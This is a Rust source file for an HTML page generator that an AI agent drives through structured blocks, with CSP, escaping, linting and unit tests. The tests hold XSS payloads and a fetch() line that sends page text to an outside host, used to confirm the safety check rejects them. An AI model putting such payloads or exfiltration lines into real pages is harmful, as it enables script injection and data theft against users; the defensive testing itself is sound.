//! Self-contained HTML pages from structured input (`specs/014` §7.2–7.3). The agent describes a page as data
//! (markdown, tables, tabs, code, callouts, stats) and this module writes the markup. Agent text always goes
//! in as text; the only code in a page is the audited runtime, plus a free-form script if one was asked for.
//! The finished page is re-parsed and checked by [`crate::htmllint`] before it is returned, so a bug in the
//! generator cannot produce an unsafe page.

use crate::chart::{self, ChartSpec};
use crate::htmllint::{lint, lint_user_script, RUNTIME_JS};
use crate::markdown::{escape, to_html_shift};
use crate::DocError;
use serde_json::Value;

const CSS: &str = include_str!("page.css");
/// The content security policy added to every page (`specs/014` §7.3 rule 4), plus `base-uri` and `form-action`,
/// which `default-src` does not cover.
pub const CSP: &str = "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'";

pub const MAX_BLOCKS: usize = 200;
pub const MAX_TABLE_ROWS: usize = 2000;
pub const MAX_TABLE_COLS: usize = 40;
const MAX_TEXT: usize = 1 << 20;
const MAX_SCRIPT: usize = 20_000;
const MAX_TABS: usize = 12;
const MAX_STATS: usize = 12;
pub const MAX_CHARTS: usize = 12;
const MAX_GRID: usize = 12;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Theme {
    Auto,
    Light,
    Dark,
}

#[derive(Debug, Clone)]
pub struct Table {
    pub caption: Option<String>,
    pub columns: Vec<String>,
    pub rows: Vec<Vec<String>>,
    pub sortable: bool,
    pub filter: bool,
}

#[derive(Debug, Clone)]
pub struct Stat {
    pub label: String,
    pub value: String,
    pub delta: Option<String>,
}

#[derive(Debug, Clone)]
pub enum Block {
    Markdown(String),
    Table(Table),
    Tabs(Vec<(String, Vec<Block>)>),
    Code { text: String, copy: bool },
    Callout { kind: String, text: String },
    Stats(Vec<Stat>),
    /// A chart drawn into the page as an inline SVG, with an optional caption.
    Chart { spec: Box<ChartSpec>, caption: Option<String> },
    /// Blocks side by side (2 or 3 columns; one column on a narrow screen).
    Grid { cols: usize, blocks: Vec<Block> },
}

#[derive(Debug, Clone)]
pub struct PageSpec {
    pub title: String,
    pub blocks: Vec<Block>,
    pub theme: Theme,
    pub script: Option<String>,
    /// Text for the in-file provenance comment (`specs/014` §7.1); sanitised before it is written.
    pub comment: Option<String>,
}

// ---------------------------------------------------------------------------------------------- input

pub(crate) struct Budget {
    pub(crate) blocks: usize,
    pub(crate) text: usize,
    pub(crate) charts: usize,
}

impl Budget {
    pub(crate) fn new() -> Budget {
        Budget { blocks: 0, text: 0, charts: 0 }
    }
    pub(crate) fn text(&mut self, s: &str) -> Result<(), DocError> {
        self.text += s.len();
        if self.text > MAX_TEXT {
            return Err(DocError(format!("the page's text is over {} bytes", MAX_TEXT)));
        }
        Ok(())
    }
}

fn scalar(v: &Value) -> Option<String> {
    match v {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        Value::Null => Some(String::new()),
        _ => None,
    }
}

fn str_field<'a>(v: &'a Value, key: &str) -> Option<&'a str> {
    v.get(key).and_then(|x| x.as_str())
}

pub(crate) fn parse_block(v: &Value, depth: usize, b: &mut Budget) -> Result<Block, DocError> {
    b.blocks += 1;
    if b.blocks > MAX_BLOCKS {
        return Err(DocError(format!("a page has at most {} blocks", MAX_BLOCKS)));
    }
    let kind = str_field(v, "type").ok_or_else(|| DocError("every block needs a `type`: markdown, table, tabs, code, callout, stats, chart or grid".into()))?;
    let need = |key: &str| str_field(v, key).ok_or_else(|| DocError(format!("a `{}` block needs a `{}` string", kind, key)));
    Ok(match kind {
        "markdown" => {
            let t = need("text")?;
            b.text(t)?;
            Block::Markdown(t.to_string())
        }
        "code" => {
            let t = need("text")?;
            b.text(t)?;
            Block::Code { text: t.to_string(), copy: v.get("copy").and_then(|c| c.as_bool()).unwrap_or(true) }
        }
        "callout" => {
            let t = need("text")?;
            b.text(t)?;
            let k = str_field(v, "kind").unwrap_or("note");
            if !matches!(k, "note" | "warning" | "tip") {
                return Err(DocError("a callout `kind` is note, warning or tip".into()));
            }
            Block::Callout { kind: k.to_string(), text: t.to_string() }
        }
        "table" => {
            let cols: Vec<String> = v.get("columns").and_then(|c| c.as_array()).ok_or_else(|| DocError("a table needs a `columns` array".into()))?.iter().map(|c| scalar(c).unwrap_or_default()).collect();
            if cols.is_empty() || cols.len() > MAX_TABLE_COLS {
                return Err(DocError(format!("a table has between 1 and {} columns", MAX_TABLE_COLS)));
            }
            let raw = v.get("rows").and_then(|r| r.as_array()).ok_or_else(|| DocError("a table needs a `rows` array of arrays".into()))?;
            if raw.len() > MAX_TABLE_ROWS {
                return Err(DocError(format!("a table has at most {} rows; summarise or split it", MAX_TABLE_ROWS)));
            }
            let mut rows = Vec::with_capacity(raw.len());
            for r in raw {
                let cells = r.as_array().ok_or_else(|| DocError("each table row is an array of cells".into()))?;
                let mut row: Vec<String> = Vec::with_capacity(cols.len());
                for c in cells.iter().take(cols.len()) {
                    let s = scalar(c).ok_or_else(|| DocError("table cells are text, numbers, true/false or null".into()))?;
                    b.text(&s)?;
                    row.push(s.chars().take(2000).collect());
                }
                row.resize(cols.len(), String::new());
                rows.push(row);
            }
            for c in &cols {
                b.text(c)?;
            }
            Block::Table(Table { caption: str_field(v, "caption").map(String::from), columns: cols, rows, sortable: v.get("sortable").and_then(|x| x.as_bool()).unwrap_or(false), filter: v.get("filter").and_then(|x| x.as_bool()).unwrap_or(false) })
        }
        "chart" => {
            b.charts += 1;
            if b.charts > MAX_CHARTS {
                return Err(DocError(format!("a page has at most {} charts", MAX_CHARTS)));
            }
            let spec = v.get("chart").ok_or_else(|| DocError("a `chart` block needs a `chart` object: the same description write_chart takes (type, title, data, ...)".into()))?;
            let spec = chart::from_json(spec).map_err(|e| DocError(format!("chart block: {}", e)))?;
            let caption = str_field(v, "caption").map(|c| c.trim().to_string()).filter(|c| !c.is_empty());
            for t in spec.series.iter().map(|s| s.name.len()).chain(std::iter::once(spec.title.len())) {
                b.text += t;
            }
            b.text += spec.x.len() * spec.series.len() * 8;
            if b.text > MAX_TEXT {
                return Err(DocError(format!("the page's content is over {} bytes", MAX_TEXT)));
            }
            Block::Chart { spec: Box::new(spec), caption }
        }
        "grid" => {
            if depth >= 1 {
                return Err(DocError("a grid cannot sit inside tabs or another grid".into()));
            }
            let cols = v.get("columns").and_then(|c| c.as_u64()).unwrap_or(2);
            if !(2..=3).contains(&cols) {
                return Err(DocError("a grid has 2 or 3 `columns`".into()));
            }
            let inner = v.get("blocks").and_then(|x| x.as_array()).ok_or_else(|| DocError("a grid needs a `blocks` array".into()))?;
            if inner.is_empty() || inner.len() > MAX_GRID {
                return Err(DocError(format!("a grid holds between 1 and {} blocks", MAX_GRID)));
            }
            Block::Grid { cols: cols as usize, blocks: inner.iter().map(|x| parse_block(x, depth + 1, b)).collect::<Result<Vec<_>, _>>()? }
        }
        "tabs" => {
            if depth >= 1 {
                return Err(DocError("tabs cannot be nested inside tabs".into()));
            }
            let tabs = v.get("tabs").and_then(|t| t.as_array()).ok_or_else(|| DocError("a tabs block needs a `tabs` array".into()))?;
            if tabs.is_empty() || tabs.len() > MAX_TABS {
                return Err(DocError(format!("tabs has between 1 and {} tabs", MAX_TABS)));
            }
            let mut out = vec![];
            for t in tabs {
                let title = str_field(t, "title").filter(|s| !s.trim().is_empty()).ok_or_else(|| DocError("each tab needs a `title`".into()))?;
                b.text(title)?;
                let inner = t.get("blocks").and_then(|x| x.as_array()).ok_or_else(|| DocError("each tab needs a `blocks` array".into()))?;
                out.push((title.to_string(), inner.iter().map(|x| parse_block(x, depth + 1, b)).collect::<Result<Vec<_>, _>>()?));
            }
            Block::Tabs(out)
        }
        "stats" => {
            let items = v.get("items").and_then(|i| i.as_array()).ok_or_else(|| DocError("a stats block needs an `items` array".into()))?;
            if items.is_empty() || items.len() > MAX_STATS {
                return Err(DocError(format!("stats has between 1 and {} items", MAX_STATS)));
            }
            let mut out = vec![];
            for i in items {
                let label = str_field(i, "label").ok_or_else(|| DocError("each stat needs a `label`".into()))?;
                let value = i.get("value").and_then(scalar).ok_or_else(|| DocError("each stat needs a `value`".into()))?;
                b.text(label)?;
                b.text(&value)?;
                out.push(Stat { label: label.to_string(), value, delta: i.get("delta").and_then(scalar).filter(|d| !d.is_empty()) });
            }
            Block::Stats(out)
        }
        other => return Err(DocError(format!("unknown block type `{}`; use markdown, table, tabs, code, callout, stats, chart or grid", other))),
    })
}

/// Read a page from the arguments of `write_html`: `title`, then `blocks` (or `body_md` for one markdown block),
/// and optionally `theme` and `script`.
pub fn from_json(v: &Value) -> Result<PageSpec, DocError> {
    let title = str_field(v, "title").map(str::trim).filter(|t| !t.is_empty()).ok_or_else(|| DocError("a page needs a `title`".into()))?;
    if title.chars().count() > 200 {
        return Err(DocError("the title is over 200 characters".into()));
    }
    let mut b = Budget::new();
    b.text = title.len();
    let mut blocks = vec![];
    if let Some(md) = str_field(v, "body_md") {
        b.text(md)?;
        b.blocks += 1;
        blocks.push(Block::Markdown(md.to_string()));
    }
    if let Some(list) = v.get("blocks") {
        for x in list.as_array().ok_or_else(|| DocError("`blocks` is an array".into()))? {
            blocks.push(parse_block(x, 0, &mut b)?);
        }
    }
    if blocks.is_empty() {
        return Err(DocError("a page needs `blocks` (or `body_md`)".into()));
    }
    let theme = match str_field(v, "theme").unwrap_or("auto") {
        "auto" => Theme::Auto,
        "light" => Theme::Light,
        "dark" => Theme::Dark,
        _ => return Err(DocError("`theme` is auto, light or dark".into())),
    };
    let script = match str_field(v, "script").map(str::trim).filter(|s| !s.is_empty()) {
        Some(s) if s.len() > MAX_SCRIPT => return Err(DocError(format!("the script is over {} bytes", MAX_SCRIPT))),
        Some(s) => Some(s.to_string()),
        None => None,
    };
    Ok(PageSpec { title: title.to_string(), blocks, theme, script, comment: None })
}

// ---------------------------------------------------------------------------------------------- output

pub(crate) struct Cx {
    pub(crate) ids: usize,
    pub(crate) runtime: bool,
    pub(crate) charts: bool,
    /// How far markdown headings are pushed down: 1 on a page (the title is the h1), 2 under a section or slide title.
    pub(crate) shift: usize,
}

impl Cx {
    pub(crate) fn new(shift: usize) -> Cx {
        Cx { ids: 0, runtime: false, charts: false, shift }
    }
}

fn numeric(s: &str) -> bool {
    let t: String = s.chars().filter(|c| !matches!(c, ',' | '$' | '%' | ' ')).collect();
    !t.is_empty() && t.parse::<f64>().is_ok()
}

pub(crate) fn render_block(b: &Block, cx: &mut Cx, out: &mut String) {
    cx.ids += 1;
    let n = cx.ids;
    match b {
        Block::Markdown(t) => out.push_str(&format!("<section class=\"md\">\n{}</section>\n", to_html_shift(t, cx.shift))),
        Block::Code { text, copy } => {
            out.push_str("<div class=\"code\">");
            if *copy {
                cx.runtime = true;
                out.push_str(&format!("<button type=\"button\" class=\"copy\" data-copy=\"#code{}\">Copy</button>", n));
            }
            out.push_str(&format!("<pre id=\"code{}\"><code>{}</code></pre></div>\n", n, escape(text)));
        }
        Block::Callout { kind, text } => out.push_str(&format!("<aside class=\"callout {}\" role=\"note\">{}</aside>\n", kind, to_html_shift(text, cx.shift))),
        Block::Chart { spec, caption } => {
            cx.charts = true;
            cx.runtime = true;
            out.push_str(&format!("<figure class=\"chart\">{}", chart::inline_svg(spec, &format!("c{}", n))));
            if let Some(c) = caption {
                out.push_str(&format!("<figcaption>{}</figcaption>", escape(c)));
            }
            out.push_str("</figure>\n");
        }
        Block::Grid { cols, blocks } => {
            out.push_str(&format!("<div class=\"grid cols{}\">\n", cols));
            for b in blocks {
                render_block(b, cx, out);
            }
            out.push_str("</div>\n");
        }
        Block::Table(t) => {
            let id = format!("table{}", n);
            if t.filter {
                cx.runtime = true;
                out.push_str(&format!("<label class=\"filter\">Filter rows<input type=\"search\" data-filter=\"{}\" placeholder=\"Type to filter\" aria-label=\"Filter rows\"></label>\n", id));
            }
            if t.sortable {
                cx.runtime = true;
            }
            out.push_str(&format!("<div class=\"table-wrap\"><table id=\"{}\"{}>", id, if t.sortable { " data-sortable" } else { "" }));
            if let Some(c) = &t.caption {
                out.push_str(&format!("<caption>{}</caption>", escape(c)));
            }
            out.push_str("<thead><tr>");
            for c in &t.columns {
                out.push_str(&format!("<th scope=\"col\">{}</th>", escape(c)));
            }
            out.push_str("</tr></thead><tbody>");
            for r in &t.rows {
                out.push_str("<tr>");
                for c in r {
                    out.push_str(&format!("<td{}>{}</td>", if numeric(c) { " class=\"num\"" } else { "" }, escape(c)));
                }
                out.push_str("</tr>");
            }
            out.push_str("</tbody></table></div>\n");
        }
        Block::Tabs(tabs) => {
            cx.runtime = true;
            out.push_str("<div class=\"tabs\" data-tabs><div role=\"tablist\">");
            for (i, (title, _)) in tabs.iter().enumerate() {
                out.push_str(&format!("<button type=\"button\" role=\"tab\" id=\"tabs{n}-tab{i}\" aria-controls=\"tabs{n}-panel{i}\" aria-selected=\"{}\">{}</button>", i == 0, escape(title), n = n, i = i));
            }
            out.push_str("</div>");
            for (i, (title, blocks)) in tabs.iter().enumerate() {
                out.push_str(&format!("<div role=\"tabpanel\" id=\"tabs{n}-panel{i}\" aria-labelledby=\"tabs{n}-tab{i}\"><h3 class=\"tab-title\">{}</h3>\n", escape(title), n = n, i = i));
                for b in blocks {
                    render_block(b, cx, out);
                }
                out.push_str("</div>");
            }
            out.push_str("</div>\n");
        }
        Block::Stats(items) => {
            out.push_str("<dl class=\"stats\">");
            for s in items {
                out.push_str(&format!("<div><dt>{}</dt><dd>{}{}</dd></div>", escape(&s.label), escape(&s.value), s.delta.as_ref().map(|d| format!("<small>{}</small>", escape(d))).unwrap_or_default()));
            }
            out.push_str("</dl>\n");
        }
    }
}

/// Text safe to put inside an HTML comment: no `--`, no `>`, no control characters, bounded.
pub fn comment_text(s: &str) -> String {
    let flat: String = s.chars().filter(|c| !c.is_control() || *c == ' ').take(400).collect();
    flat.replace("--", "- -").replace(['>', '<'], " ")
}

/// What every generated document has in common: the head with its content security policy, the stylesheet, the
/// runtime when something needs it, and the final safety check on the whole result.
pub(crate) struct Shell<'a> {
    pub title: &'a str,
    pub theme: Theme,
    pub comment: Option<&'a str>,
    pub charts: bool,
    pub runtime: bool,
    pub script: Option<&'a str>,
    /// Markup between `<body>` and the content, and after it.
    pub open: &'a str,
    pub body: &'a str,
    pub close: &'a str,
}

pub(crate) fn assemble(sh: &Shell) -> Result<String, DocError> {
    let theme = match sh.theme {
        Theme::Auto => "",
        Theme::Light => " data-theme=\"light\"",
        Theme::Dark => " data-theme=\"dark\"",
    };
    let mut html = String::with_capacity(sh.body.len() + CSS.len() + 2048);
    html.push_str("<!doctype html>\n");
    if let Some(c) = sh.comment {
        html.push_str(&format!("<!-- {} -->\n", comment_text(c)));
    }
    let chart_css = if sh.charts { chart::css() } else { String::new() };
    html.push_str(&format!(
        "<html lang=\"en\"{}>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<meta name=\"color-scheme\" content=\"light dark\">\n<meta http-equiv=\"Content-Security-Policy\" content=\"{}\">\n<title>{}</title>\n<style>\n{}{}</style>\n</head>\n<body>\n{}",
        theme,
        CSP,
        escape(sh.title),
        CSS,
        chart_css,
        sh.open
    ));
    html.push_str(sh.body);
    html.push_str(sh.close);
    if sh.runtime {
        html.push_str(&format!("<script>\n{}</script>\n", RUNTIME_JS.trim_end()));
    }
    if let Some(s) = sh.script {
        html.push_str(&format!("<script>\n'use strict';\n{}\n</script>\n", s));
    }
    html.push_str("</body>\n</html>\n");
    let problems = lint(&html);
    if !problems.is_empty() {
        return Err(DocError(format!("the page failed its safety check: {}", problems.join("; "))));
    }
    Ok(html)
}

/// Build the page. Fails if the generator would produce something the safety check rejects.
pub fn render(spec: &PageSpec) -> Result<String, DocError> {
    if let Some(s) = &spec.script {
        let problems = lint_user_script(s);
        if !problems.is_empty() {
            return Err(DocError(format!("the script failed its safety check: {}", problems.join("; "))));
        }
    }
    let mut cx = Cx::new(1);
    let mut body = String::new();
    for b in &spec.blocks {
        render_block(b, &mut cx, &mut body);
    }
    assemble(&Shell {
        title: &spec.title,
        theme: spec.theme,
        comment: spec.comment.as_deref(),
        charts: cx.charts,
        runtime: cx.runtime,
        script: spec.script.as_deref(),
        open: &format!("<main>\n<h1>{}</h1>\n", escape(&spec.title)),
        body: &body,
        close: "</main>\n",
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn page(v: Value) -> Result<String, DocError> {
        from_json(&v).and_then(|s| render(&s))
    }

    fn full() -> Value {
        json!({
            "title": "Q3 review",
            "blocks": [
                {"type": "markdown", "text": "# Summary\n\nRevenue **grew**. See [the plan](#plan).\n\n- one\n- two"},
                {"type": "stats", "items": [{"label": "Revenue", "value": "$1.2M", "delta": "+12%"}, {"label": "Churn", "value": 3.1}]},
                {"type": "table", "caption": "By region", "columns": ["Region", "Q3", "Share"], "rows": [["North", 120, "34%"], ["South", "95", "27%"], ["East", null, "x"]], "sortable": true, "filter": true},
                {"type": "tabs", "tabs": [{"title": "Plan", "blocks": [{"type": "markdown", "text": "## Plan\n\nDo it."}]}, {"title": "Risks", "blocks": [{"type": "callout", "kind": "warning", "text": "Watch **churn**."}]}]},
                {"type": "code", "text": "cargo test\n# <done>", "copy": true}
            ],
            "theme": "dark"
        })
    }

    #[test]
    fn a_full_page_renders_and_passes_its_own_safety_check() {
        let h = page(full()).unwrap();
        assert!(h.starts_with("<!doctype html>\n<html lang=\"en\" data-theme=\"dark\">") && h.contains("<h1>Q3 review</h1>") && h.contains("<title>Q3 review</title>"), "{}", &h[..300]);
        assert!(h.contains("http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; base-uri 'none'; form-action 'none'\""));
        assert!(h.contains("<table id=\"table3\" data-sortable>") && h.contains("data-filter=\"table3\"") && h.contains("<td class=\"num\">120</td>") && h.contains("<td class=\"num\">34%</td>") && h.contains("<td>x</td>"), "{}", h);
        assert!(h.contains("role=\"tab\"") && h.contains("data-tabs") && h.contains("class=\"callout warning\"") && h.contains("data-copy=\"#code") && h.contains("# &lt;done&gt;"), "{}", h);
        assert!(h.contains("<dt>Revenue</dt><dd>$1.2M<small>+12%</small></dd>") && h.contains("<dd>3.1</dd>") && h.contains("<a href=\"#plan\">the plan</a>"), "{}", h);
        assert_eq!(h.matches("<script>").count(), 1, "only the audited runtime");
        assert!(lint(&h).is_empty());
        assert!(h.len() < 40_000, "{}", h.len());
    }

    /// `DELPHI_DOCS_HTML_OUT=/some/dir cargo test -p delphi-docs write_samples -- --ignored`, then open the files in a
    /// real browser. `interactive.html` drives its own table, filter and tabs and reports what happened in `<title>`.
    #[test]
    #[ignore = "writes files for a browser to check"]
    fn write_samples_for_a_browser() {
        let Ok(dir) = std::env::var("DELPHI_DOCS_HTML_OUT") else { return };
        let script = "var out = [];\nvar table = document.querySelector('table');\nvar heads = table.querySelectorAll('thead th');\nfunction col(i) { return Array.prototype.map.call(table.tBodies[0].rows, function (r) { return r.cells[i].textContent; }).join(','); }\nout.push('initial:' + col(0));\nheads[1].click();\nout.push('asc:' + col(0));\nheads[1].click();\nout.push('desc:' + col(0));\nvar input = document.querySelector('input[data-filter]');\ninput.value = 'sou';\ninput.dispatchEvent(new Event('input'));\nout.push('visible:' + Array.prototype.filter.call(table.tBodies[0].rows, function (r) { return !r.hidden; }).length);\nvar tabs = document.querySelectorAll('[role=\"tab\"]');\ntabs[1].click();\nout.push('tab2:' + tabs[1].getAttribute('aria-selected') + ' panel1hidden:' + document.getElementById(tabs[1].getAttribute('aria-controls')).hidden + ' panel0hidden:' + document.getElementById(tabs[0].getAttribute('aria-controls')).hidden);\nout.push('enhanced:' + document.querySelector('[data-tabs]').classList.contains('enhanced'));\ndocument.title = out.join(' | ');";
        let mut spec = full();
        spec["script"] = json!(script);
        spec["blocks"][2]["rows"] = json!([["North", 120, "34%"], ["South", 95, "27%"], ["East", 300, "x"]]);
        std::fs::write(format!("{}/interactive.html", dir), page(spec).unwrap()).unwrap();
        std::fs::write(format!("{}/static.html", dir), page(full()).unwrap()).unwrap();
    }

    #[test]
    fn output_is_deterministic_and_a_static_page_carries_no_script_at_all() {
        assert_eq!(page(full()).unwrap(), page(full()).unwrap());
        let h = page(json!({"title": "Plain", "body_md": "just text\n\n| a | b |\n|---|---|\n| 1 | 2 |"})).unwrap();
        assert!(!h.contains("<script"), "no runtime without an interactive block: {}", h);
        assert!(h.contains("<table><thead>"));
    }

    #[test]
    fn agent_text_is_text_everywhere() {
        let evil = "</title><script>alert(1)</script><img src=x onerror=alert(1)>\"'&";
        let h = page(json!({
            "title": evil,
            "blocks": [
                {"type": "markdown", "text": evil},
                {"type": "table", "caption": evil, "columns": [evil], "rows": [[evil]], "sortable": true},
                {"type": "tabs", "tabs": [{"title": evil, "blocks": [{"type": "markdown", "text": evil}]}]},
                {"type": "code", "text": evil},
                {"type": "callout", "text": evil},
                {"type": "stats", "items": [{"label": evil, "value": evil, "delta": evil}]}
            ]
        }))
        .unwrap();
        assert!(!h.contains("<script>alert") && !h.contains("<img") && !h.contains("onerror=alert(1)>") && !h.contains("</title><script"), "{}", h);
        assert_eq!(h.matches("<script>").count(), 1, "still only the runtime");
        assert!(lint(&h).is_empty());
        assert!(h.contains("&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;"));
    }

    #[test]
    fn a_script_is_included_when_it_passes_and_refused_when_it_does_not() {
        let ok = page(json!({"title": "T", "body_md": "x", "script": "document.querySelectorAll('p').forEach(function (p) { p.classList.add('seen'); });"})).unwrap();
        assert_eq!(ok.matches("<script>").count(), 1);
        assert!(ok.contains("p.classList.add('seen')"));
        for (script, expect) in [("fetch('https://e.com?x=' + document.body.textContent)", "fetch"), ("eval('1')", "eval"), ("</script><script src=x>", "`</`"), ("location = 'https://e.com'", "location")] {
            let e = page(json!({"title": "T", "body_md": "x", "script": script})).unwrap_err();
            assert!(e.0.contains("failed its safety check") && e.0.contains(expect), "{:?}: {}", script, e);
        }
        // with interactive blocks too: runtime first, then the script
        let both = page(json!({"title": "T", "blocks": [{"type": "table", "columns": ["a"], "rows": [[1]], "sortable": true}], "script": "var n = 1;"})).unwrap();
        assert_eq!(both.matches("<script>").count(), 2);
        assert!(both.find("Delphi page runtime").unwrap() < both.find("var n = 1;").unwrap());
    }

    #[test]
    fn the_provenance_comment_is_sanitised() {
        let mut s = from_json(&json!({"title": "T", "body_md": "x"})).unwrap();
        s.comment = Some("delphi artifact: role=architect -- <script>x</script> --> trust=L3\nline".into());
        let h = render(&s).unwrap();
        let line = h.lines().nth(1).unwrap();
        assert!(line.starts_with("<!-- delphi artifact: role=architect") && line.ends_with("-->") && line.matches("--").count() == 2 && !line.contains("<script"), "{}", line);
    }

    #[test]
    fn bad_input_is_refused_with_a_reason() {
        for (v, expect) in [
            (json!({"blocks": []}), "title"),
            (json!({"title": "T"}), "blocks"),
            (json!({"title": "T", "blocks": [{"type": "markdown"}]}), "`text`"),
            (json!({"title": "T", "blocks": [{"type": "video"}]}), "unknown block type"),
            (json!({"title": "T", "blocks": [{"type": "table", "columns": [], "rows": []}]}), "columns"),
            (json!({"title": "T", "blocks": [{"type": "table", "columns": ["a"], "rows": [[{"x": 1}]]}]}), "cells"),
            (json!({"title": "T", "blocks": [{"type": "tabs", "tabs": [{"title": "a", "blocks": [{"type": "tabs", "tabs": []}]}]}]}), "nested"),
            (json!({"title": "T", "body_md": "x", "theme": "neon"}), "theme"),
            (json!({"title": "T", "blocks": [{"type": "callout", "kind": "loud", "text": "x"}]}), "callout"),
        ] {
            let e = page(v.clone()).unwrap_err();
            assert!(e.0.contains(expect), "{} -> {}", v, e);
        }
        let many: Vec<Value> = (0..201).map(|_| json!({"type": "markdown", "text": "x"})).collect();
        assert!(page(json!({"title": "T", "blocks": many})).unwrap_err().0.contains("at most 200 blocks"));
        let rows: Vec<Value> = (0..2001).map(|i| json!([i])).collect();
        assert!(page(json!({"title": "T", "blocks": [{"type": "table", "columns": ["a"], "rows": rows}]})).unwrap_err().0.contains("2000 rows"));
        assert!(page(json!({"title": "T", "body_md": "x".repeat(2 << 20)})).unwrap_err().0.contains("over"));
    }

    #[test]
    fn the_page_reads_back_as_the_content_it_was_given() {
        let h = page(full()).unwrap();
        let e = crate::extract(h.as_bytes(), "q3.html", &crate::Request::default(), &crate::Limits::default()).unwrap();
        assert!(e.text.contains("Title: Q3 review") && e.text.contains("# Q3 review") && e.text.contains("| North | 120 | 34% |") && e.text.contains("Revenue **grew**"), "{}", e.text);
        assert!(e.loss.iter().any(|l| l.contains("script")), "the runtime script is counted: {:?}", e.loss);
    }
}
